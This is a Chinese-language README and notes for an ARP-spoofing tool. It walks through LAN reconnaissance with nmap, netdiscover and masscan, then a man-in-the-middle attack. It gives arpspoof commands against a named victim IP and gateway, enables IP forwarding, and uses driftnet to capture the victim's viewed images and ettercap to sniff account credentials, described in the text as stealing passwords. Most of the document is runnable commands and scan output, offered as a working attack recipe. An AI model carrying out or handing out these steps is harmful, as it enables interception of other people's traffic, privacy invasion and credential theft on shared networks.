#ARP欺骗代码

本项目可实现局域网的arp欺骗。
#使用方法

可以将目标主机发往网关的流量定向骗至本主机 安装 scapy 模块

    sudo apt install python-scapy
    sudo ./venv/bin/python main.py -i eth0 -t 受害人ip -m rep -s 网关ip
    sudo ./venv/bin/python main.py -i eth0 -t 受害人ip -m req -s 网关ip

开启流量转发
不开启的话，被欺骗对象无法上网

    echo 1 > /proc/sys/net/ipv4/ip_forward
---
#内网扫描
##nmap扫描

Nmap包含四项基本功能：

主机发现（Host Discovery）

端口扫描（Port Scanning）

版本侦测（Version Detection）

操作系统侦测（Operating System Detection）


kali扫描内网在线主机和网关
https://blog.csdn.net/weixin_39793813/article/details/111282240?utm_term=kali%20linux%E6%89%AB%E6%8F%8F%E5%B1%80%E5%9F%9F%E7%BD%91&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2

`ifconfig`

        docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500 #应用虚拟网卡
            inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
            ether 02:42:b5:ad:0d:a5  txqueuelen 0  (Ethernet)
            RX packets 0  bytes 0 (0.0 B)
            RX errors 0  dropped 0  overruns 0  frame 0
            TX packets 0  bytes 0 (0.0 B)
            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

    eth0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500 #以太网
            ether 18:c0:4d:47:c1:5b  txqueuelen 1000  (Ethernet)
            RX packets 0  bytes 0 (0.0 B)
            RX errors 0  dropped 0  overruns 0  frame 0
            TX packets 0  bytes 0 (0.0 B)
            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

    lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536   #回环接口
            inet 127.0.0.1  netmask 255.0.0.0
            inet6 ::1  prefixlen 128  scopeid 0x10<host>
            loop  txqueuelen 1000  (Local Loopback)
            RX packets 258  bytes 20460 (19.9 KiB)
            RX errors 0  dropped 0  overruns 0  frame 0
            TX packets 258  bytes 20460 (19.9 KiB)
            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

    wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500  #无线网卡
            inet 192.168.124.14  netmask 255.255.255.0  broadcast 192.168.124.255 #网卡信息
            inet6 fe80::8b0e:11c1:df70:9051  prefixlen 64  scopeid 0x20<link>
            ether 60:ee:5c:6f:a1:d5  txqueuelen 1000  (Ethernet)
            RX packets 92829  bytes 91329703 (87.0 MiB)
            RX errors 0  dropped 0  overruns 0  frame 0
            TX packets 79605  bytes 11458130 (10.9 MiB)
            TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
---

arp - a  显示arp缓存表

        ? (192.168.124.17) at 54:0e:58:c8:c0:53 [ether] on wlan0
        ? (192.168.124.24) at 74:c1:4f:63:5e:24 [ether] on wlan0
        ? (192.168.124.15) at <incomplete> on wlan0
        ? (192.168.124.23) at <incomplete> on wlan0
        ? (192.168.124.3) at 94:87:e0:01:22:69 [ether] on wlan0
        ? (192.168.124.10) at 3c:95:09:4c:49:57 [ether] on wlan0
        ? (192.168.124.18) at cc:2d:83:e4:4e:c9 [ether] on wlan0
        moshujia.cn (192.168.124.1) at dc:da:80:cb:1c:1e [ether] on wlan0
        ? (192.168.124.6) at e6:c0:98:4a:57:7b [ether] on wlan0
                                                         

---
`sudo nmap -sP 192.168.124.0/24` #nmap完整扫描局域网内存活主机该扫描需要手机与网络发生数据交换，否则无法扫描到

         sudo nmap -sP 192.168.124.0/24                     
        Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-19 21:55 UTC
        Nmap scan report for moshujia.cn (192.168.124.1)
        Host is up (0.0045s latency).
        MAC Address: DC:DA:80:CB:1C:1E (New H3C Technologies)
        Nmap scan report for 192.168.124.3 (192.168.124.3)
        Host is up (1.3s latency).
        MAC Address: 94:87:E0:01:22:69 (Xiaomi Communications)
        Nmap scan report for 192.168.124.6 (192.168.124.6)
        Host is up (0.55s latency).
        MAC Address: E6:C0:98:4A:57:7B (Unknown)
        Nmap scan report for 192.168.124.15 (192.168.124.15)
        Host is up (1.2s latency).
        MAC Address: 84:6F:CE:C5:2B:07 (Guangdong Oppo Mobile Telecommunications)
        Nmap scan report for 192.168.124.17 (192.168.124.17)
        Host is up (2.0s latency).
        MAC Address: 54:0E:58:C8:C0:53 (Guangdong Oppo Mobile Telecommunications)
        Nmap scan report for 192.168.124.14 (192.168.124.14)
        Host is up.
        Nmap done: 256 IP addresses (6 hosts up) scanned in 49.74 seconds

---

主动扫描就是主动发送一个ARP请求，等待目标主机的响应

使用nmap工具实施arp主动扫描：nmap -PR 目标地址（-PR表示实施arp ping扫描）

        nmap -PR 192.168.124.10       
        Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-19 20:33 UTC
        Nmap scan report for 192.168.124.10 (192.168.124.10)
        Host is up (0.026s latency).
        Not shown: 993 filtered tcp ports (no-response)
        PORT     STATE SERVICE
        80/tcp   open  http
        135/tcp  open  msrpc
        139/tcp  open  netbios-ssn
        445/tcp  open  microsoft-ds
        2179/tcp open  vmrdp
        3306/tcp open  mysql
        5357/tcp open  wsdapi
        Nmap done: 1 IP address (1 host up) scanned in 8.35 seconds


---

nmap –T4 –A –v targethost

其中-A选项用于使用进攻性（Aggressive）方式扫描；-T4指定扫描过程使用的时序（Timing），总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况良好的情况推荐使用T4；-v表示显示冗余（verbosity）信息，在扫描过程中显示扫描的细节，从而让用户了解当前的扫描状态。

---

被动扫描

被动扫描是通过长期监听ARP广播，来发现同一局域网中的活动主机

Netdiscover既可以主动扫描，亦可以以被动模式嗅探存活的主机

使用方法如下：netdiscover -p（-p被动模式，不发送任何数据包，仅嗅探）

---

设备mac查询

通过对目标主机实施arp扫描后，可以获取到目标主机的MAC地址，以及mac生产商，但有一些设备无法获取到其生产厂商，此时可以登录https://mac.51240.com网站进行查询

---

raceroute工具

Traceroute是用来侦测由源主机到目标主机所经过的路由请求的重要工具

Traceroute工具收到目的主机ip地址后，首先给目的主机发送一个TTL=1的udp包，而经过的第一个路由器收到这个数据包之后，自动把TTL减去1（TTL指生存时间）

使用traceroute工具实施路由跟踪的方法如下：traceroute 目的主机

---

上级网络路由跟踪

如果连接到最底层网络的话，则可以通过路由跟踪的方式扫描到上级网络的路由，根据获取的路由信息，可以猜测上级网络的范围大小

Nmap工具提供了一个--traceroute选项，可以用来实现路由跟踪

具体操作如下：nmap --traceroute www.baidu.com

----

`sudo masscan -p80,8000-8100 192.168.124.1-192.168.124.254 ` #对我们这个局域网主机端口80、8000至8100进行检测

---

sudo arpspoof -i eth0 -t 192.168.2.143 192.168.2.1#进行arp断网攻击 目标主机ip 目标主机网关
arpspoof  -i  eth0  -t  攻击主机地址 -r  ⽹关地址或者其他主机地址

---
若mac 地址静态绑定则arp攻击失效 
绑定方法 arp - s 网关ip 网关mac地址

---
driftnet  用于抓取网络流量中的图片，并将他们显示出来
[链接]:https://blog.csdn.net/light_travlling/article/details/103915829
sudo driftnet -i eth0 -a -d /home/zhouyi/桌面/picture 将网络流量中的图片保存在桌面
[链接]:https://blog.csdn.net/qq_33571718/article/details/99684525?utm_medium=distribute.pc_relevant.none-task-blog-2
ettercap -Tq -i eth0 #目标主机监听获取帐号

        开启转发
        echo 1 > /proc/sys/net/ipv4/ip_forward. 
        开启arp欺骗注意网关和目标主机的ip位置互换
        arpspoof -i eth0 -t 192.168.2.1 192.168.2.143
        将目标主机浏览的图片写到桌面
        sudo driftnet -i eth0 -a -d /home/zhouyi/桌面/picture
        对目标主机进行监听，窃取账号密码
        ettercap -Tq -i eth0

 sudo tcpdump -i wlan0 -nn 'host 192.168. 1.1

 ---------------

 ettercap -G #启动图形界面
 [链接]:https://blog.csdn.net/qq_45557476/article/details/121428542